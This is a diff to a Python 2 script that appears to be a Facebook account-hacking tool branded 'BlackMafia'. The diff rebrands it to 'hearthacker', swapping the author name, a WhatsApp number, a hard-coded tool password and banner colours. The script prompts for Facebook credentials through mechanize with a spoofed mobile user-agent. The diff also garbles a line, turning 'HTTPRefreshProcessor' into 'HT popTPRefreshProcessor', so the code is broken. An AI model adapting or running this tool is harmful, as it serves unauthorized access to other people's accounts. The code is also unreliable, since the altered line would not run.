@@ -15,7 +15,7 @@ reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.set_handle_refresh(mechanize._http.HT popTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 
@@ -91,10 +91,10 @@ print  """
   \033[1;96m ─────────────•◈•──────────  
    \033[1;92m███████▒▒Welcome To BlackMafia▒▒████████
 \033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mBlackMafia\033[1;95m♡╭──────────•◈•──────────╮♡
-\033[1;94mAuthor\033[1;91m: \033[1;91mlovehacker
+\033[1;94mAuthor\033[1;91m: \033[1;91mhearthacker
 \033[1;94mBlackMafia\033[1;91m: \033[1;91▒▓██████████████]99.9
-\033[1;94mFacebook\033[1;91m: \033[1;91mlovehacker
-\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923094161457
+\033[1;94mFacebook\033[1;91m: \033[1;91mhearthacker
+\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923106688389
 \033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mBlackMafia\033[1;95m♡╰──────────•◈•──────────╯♡"""
 jalan('              \033[1;96m....................BlackMafia.....................:')
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
@@ -104,8 +104,8 @@ jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
 print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin BlackMafia\033[1;95m♡╰──────────•◈•──────────╯♡"
 
-CorrectUsername = "BlackMafia"
-CorrectPassword = "lovehacker"
+CorrectUsername = "BlackHeart"
+CorrectPassword = "Hearthacker"
 
 loop = 'true'
 while (loop == 'true'):
@@ -133,8 +133,8 @@ def login():
 		print logo
 		jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )
 		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )
-		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
-		print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mHearthacker\033[1;95m♡──────────•◈•──────────♡"
+		print('	   \033[1;94m♡\x1b[1;93m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )
 		print('	' )
 		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
